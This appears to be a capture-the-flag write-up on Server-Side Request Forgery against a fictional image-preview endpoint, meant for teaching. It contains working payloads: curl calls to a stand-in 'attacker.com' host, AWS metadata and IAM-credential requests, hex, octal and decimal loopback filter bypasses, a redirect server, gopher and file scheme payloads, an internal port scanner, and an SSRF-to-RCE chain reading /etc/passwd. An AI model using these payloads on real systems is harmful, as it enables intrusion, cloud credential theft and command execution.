@@ -1,0 +1,287 @@
+---
+title: "Server-Side Request Forgery CTF Writeup: Internal Access"
+sidebarTitle: "SSRF"
+description: "SSRF CTF challenge walkthrough: discover internal services, bypass filters, read cloud metadata, and chain SSRF with other vulnerabilities to capture the flag."
+---
+
+Server-Side Request Forgery is one of the most impactful vulnerability classes in modern web CTFs because it weaponizes the server's own network position against itself. The target application fetches a URL on your behalf — and if you can control that URL, you can reach internal services, cloud metadata APIs, and admin interfaces that are completely invisible from the outside internet. This writeup walks through a realistic SSRF challenge where you escalate from a simple URL parameter to reading an internal flag file, bypassing filter protections along the way.
+
+## Challenge Background
+
+The challenge presents a web application at `http://target.ctf` that offers an "image preview" feature: you supply a URL, and the server fetches the image and displays it on the page. The feature is at `/preview?url=`. The flag is stored on an internal admin service running on `127.0.0.1:8080` at the path `/flag`.
+
+The application has a basic SSRF filter that blocks naive `127.0.0.1` and `localhost` inputs — so you'll need to bypass it. The server also runs on AWS EC2, which means the metadata endpoint `169.254.169.254` is a secondary target of interest.
+
+## Attack Flow
+
+<Steps>
+  <Step title="Identify the SSRF Vector">
+    Start by confirming that the application actually makes server-side requests. Submit your own server's URL as the `url` parameter:
+
+    ```bash
+    # Set up a listener on your server first
+    python3 -m http.server 8080
+
+    # Then submit your URL to the target
+    curl "http://target.ctf/preview?url=http://attacker.com:8080/probe"
+    ```
+
+    Your server receives an incoming request from `target.ctf`'s IP address — not from your browser. This confirms the server itself is making the request. The vulnerability is real.
+
+    Also probe other parameters in the application. SSRF hides in any feature that accepts a URL or hostname: webhook endpoints, PDF generators, file import fields, social media preview fetchers, and XML parsers (via XXE). Don't limit your search to the most obvious input.
+  </Step>
+
+  <Step title="Probe Internal Services">
+    With SSRF confirmed, point the server at localhost to discover internal services. Start with common ports:
+
+    ```bash
+    # Probe the internal admin service
+    curl "http://target.ctf/preview?url=http://127.0.0.1/flag"
+
+    # Try the IPv6 loopback equivalent
+    curl "http://target.ctf/preview?url=http://[::1]/flag"
+
+    # Try common internal service ports
+    curl "http://target.ctf/preview?url=http://127.0.0.1:8080/flag"
+    curl "http://target.ctf/preview?url=http://127.0.0.1:8080/admin"
+    ```
+
+    The naive `127.0.0.1` and `localhost` attempts return an error: **"Blocked: internal addresses are not allowed."** The filter is active. Move on to bypass techniques.
+
+    While the filter is blocking localhost, test whether other private ranges are accessible:
+
+    ```python
+    import requests
+
+    # Probe common internal IP ranges
+    targets = [
+        "http://10.0.0.1/",
+        "http://10.0.0.1:8080/",
+        "http://172.16.0.1/",
+        "http://192.168.1.1/",
+    ]
+
+    for t in targets:
+        r = requests.get(f"http://target.ctf/preview?url={t}", timeout=5)
+        print(f"{t}: {r.status_code} — {len(r.content)} bytes")
+    ```
+
+    Note response size differences. A response with content is a live service.
+  </Step>
+
+  <Step title="Read the AWS Metadata Endpoint">
+    Since the challenge runs on EC2, the metadata service at `169.254.169.254` is a high-value target. It exposes IAM credentials, instance identity, and sometimes secrets injected at launch time.
+
+    ```bash
+    # Read the metadata root
+    curl "http://target.ctf/preview?url=http://169.254.169.254/latest/meta-data/"
+
+    # Read IAM credentials if a role is attached
+    curl "http://target.ctf/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    ```
+
+    The application fetches the metadata endpoint and returns the response body in the page. You see:
+
+    ```
+    ami-id
+    ami-launch-index
+    hostname
+    iam/
+    instance-id
+    local-ipv4
+    ```
+
+    Follow the `iam/` path to enumerate attached roles and extract temporary credentials. Even if the flag isn't in the metadata directly, IAM credentials might let you access an S3 bucket or other service where the flag lives.
+
+    ```bash
+    # Get the role name
+    curl "http://target.ctf/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    # Returns: ctf-role
+
+    # Get the credentials
+    curl "http://target.ctf/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ctf-role"
+    ```
+
+    <Note>
+      AWS IMDSv2 (the newer metadata service version) requires a PUT request to first obtain a session token before making GET requests. If your SSRF fetches via GET only, IMDSv2 will block you. However, many CTF challenges deliberately run IMDSv1 for simplicity. Check which version is active by observing whether your initial metadata request succeeds.
+    </Note>
+  </Step>
+
+  <Step title="Bypass the SSRF Filter">
+    The application blocks `127.0.0.1` and `localhost` by string matching. Use alternative representations that resolve to the same address but evade the filter:
+
+    ```
+    http://0x7f000001/flag
+    http://0177.0.0.1/flag
+    http://2130706433/flag
+    http://127.1/flag
+    http://[::1]/flag
+    http://[0:0:0:0:0:ffff:127.0.0.1]/flag
+    ```
+
+    Try each one until the filter doesn't catch it:
+
+    ```bash
+    # Hex encoding of 127.0.0.1
+    curl "http://target.ctf/preview?url=http://0x7f000001/flag"
+
+    # Decimal (integer) encoding
+    curl "http://target.ctf/preview?url=http://2130706433/flag"
+
+    # Short-form loopback
+    curl "http://target.ctf/preview?url=http://127.1/flag"
+    ```
+
+    The hex-encoded version `http://0x7f000001/flag` bypasses the string filter. The server resolves it to `127.0.0.1` at the OS level and fetches the internal admin service. The response body rendered on the page contains:
+
+    ```
+    CTF{ssrf_1nt3rn4l_byp4ss_m4st3r}
+    ```
+
+    Flag captured.
+  </Step>
+
+  <Step title="Access the Internal Admin Panel">
+    For completeness, the internal admin service at port 8080 also exposes an admin panel. Reach it using the same bypass technique with an explicit port:
+
+    ```bash
+    curl "http://target.ctf/preview?url=http://0x7f000001:8080/admin"
+    ```
+
+    The admin panel is a plain HTML page listing all submitted flags, user accounts, and a debug endpoint at `/admin/debug?exec=` that executes shell commands — a chained RCE vulnerability. In a real CTF, this chain (SSRF → internal service → RCE) would let you read any file on the server.
+
+    ```bash
+    # Chain SSRF with the internal debug endpoint for RCE
+    curl "http://target.ctf/preview?url=http://0x7f000001:8080/admin/debug?exec=cat+/etc/passwd"
+    ```
+  </Step>
+</Steps>
+
+## Filter Bypass Techniques Reference
+
+<Accordion title="IP Address Encoding Bypasses">
+  Many SSRF filters perform simple string matching against a blocklist. The same IPv4 address can be represented in multiple formats that all resolve identically at the OS level:
+
+  ```
+  # Standard dotted decimal
+  http://127.0.0.1/
+
+  # Hexadecimal (0x7f = 127, 0x000001 = 0.0.1)
+  http://0x7f000001/
+
+  # Octal notation (0177 = 127 in octal)
+  http://0177.0.0.1/
+
+  # Decimal integer (127 * 16777216 + 1 = 2130706433)
+  http://2130706433/
+
+  # Short-form loopback (omitting trailing octets)
+  http://127.1/
+
+  # IPv6 loopback
+  http://[::1]/
+
+  # IPv4-mapped IPv6
+  http://[::ffff:127.0.0.1]/
+  http://[0:0:0:0:0:ffff:7f00:0001]/
+  ```
+
+  Test all variants systematically. Filters that block `127.0.0.1` and `localhost` frequently miss hex, octal, and decimal encodings.
+</Accordion>
+
+<Accordion title="DNS Rebinding">
+  DNS rebinding attacks a two-phase filter that first resolves the hostname to check if it's internal, then makes the actual request. If there's a delay between the check and the fetch, you can serve a benign external IP during the check and switch your DNS record to `127.0.0.1` for the actual fetch.
+
+  The attack flow:
+  1. Register `evil.attacker.com` with an extremely short TTL (0 seconds).
+  2. Initially resolve `evil.attacker.com` to your real external IP (passes the filter check).
+  3. The server validates the IP, sees it's external, allows the request.
+  4. Between validation and the actual HTTP fetch, flip your DNS to return `127.0.0.1`.
+  5. The server re-resolves the hostname (TTL expired) and connects to localhost.
+
+  Tools like [singularity](https://github.com/nccgroup/singularity) automate DNS rebinding attacks. In CTF contexts, this technique is more commonly described in challenge write-ups than required in practice, but understanding it is essential for harder challenges.
+</Accordion>
+
+<Accordion title="Redirect Chains">
+  If the filter validates the URL before the request but doesn't follow redirects carefully, you can use an open redirect on an allowed domain to pivot to an internal address.
+
+  ```python
+  # Host this on your server — it redirects to the internal target
+  from flask import Flask, redirect
+  app = Flask(__name__)
+
+  @app.route('/redirect')
+  def ssrf_redirect():
+      return redirect("http://127.0.0.1:8080/flag", code=301)
+  ```
+
+  Then submit:
+  ```
+  http://target.ctf/preview?url=http://attacker.com/redirect
+  ```
+
+  The filter sees `attacker.com` (allowed), but the server follows the 301 redirect to `127.0.0.1`. This works when the filter checks the initial URL but not subsequent redirect destinations.
+</Accordion>
+
+<Accordion title="Protocol Smuggling">
+  Beyond HTTP, try alternative URL schemes that may be supported by the underlying request library:
+
+  ```
+  # Read local files via file://
+  file:///etc/passwd
+  file:///flag
+
+  # Interact with internal Redis via Gopher
+  gopher://127.0.0.1:6379/_KEYS *
+
+  # FTP for file retrieval
+  ftp://127.0.0.1/flag
+
+  # Dict protocol to probe open ports
+  dict://127.0.0.1:22/info
+  ```
+
+  Python's `urllib`, PHP's `file_get_contents`, and curl all support different subsets of URL schemes. The `gopher://` scheme is particularly powerful — it lets you send arbitrary TCP payloads to internal services, enabling interaction with Redis, memcached, and even crafting raw HTTP requests with custom headers.
+</Accordion>
+
+## Probing Internal Services Systematically
+
+When you have SSRF but don't know what's running internally, scan the common service ports:
+
+```python
+import requests
+import concurrent.futures
+
+BASE = "http://target.ctf/preview?url="
+
+PORTS = [21, 22, 80, 443, 3000, 3306, 4000, 4443, 5000,
+         5432, 6379, 7000, 8000, 8080, 8443, 8888, 9200, 9300]
+
+def probe(port):
+    url = f"http://127.1:{port}/"
+    try:
+        r = requests.get(BASE + url, timeout=3)
+        # Different response length or status code indicates something is listening
+        return port, r.status_code, len(r.content)
+    except requests.Timeout:
+        return port, "timeout", 0
+    except Exception as e:
+        return port, "error", 0
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+    results = executor.map(probe, PORTS)
+
+for port, status, size in results:
+    if status != "error":
+        print(f"Port {port}: status={status}, size={size}")
+```
+
+Differences in response time (slow = port open but no HTTP), response size, or status code distinguish open ports from closed ones.
+
+## Key Takeaways
+
+- **SSRF lives in any URL input.** Preview features, webhooks, image fetchers, XML imports — check them all for server-side request behavior by pointing them at your own server first.
+- **The metadata endpoint `169.254.169.254` is always your first target on cloud challenges.** It requires no filter bypass and frequently contains credentials or secrets.
+- **String-matching filters are almost always bypassable.** Learn all the IP encoding alternatives and test them systematically.
+- **Think about what the server can reach, not what you can reach.** SSRF is about the server's network position — internal services, private subnets, and link-local addresses.
+- **Chain SSRF with other vulnerabilities.** SSRF reaching an internal service with its own vulnerabilities (command injection, another SQLi, file read) is how you escalate from information disclosure to full compromise.
